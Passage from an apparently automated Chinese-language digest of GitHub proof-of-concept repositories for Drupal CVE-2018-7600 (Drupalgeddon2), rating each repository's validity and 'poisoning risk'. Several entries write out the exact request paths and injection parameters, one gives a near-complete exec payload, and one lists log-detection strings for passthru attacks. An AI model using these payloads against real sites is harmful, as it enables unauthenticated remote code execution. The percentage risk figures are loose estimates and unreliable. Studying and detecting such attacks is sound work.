提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

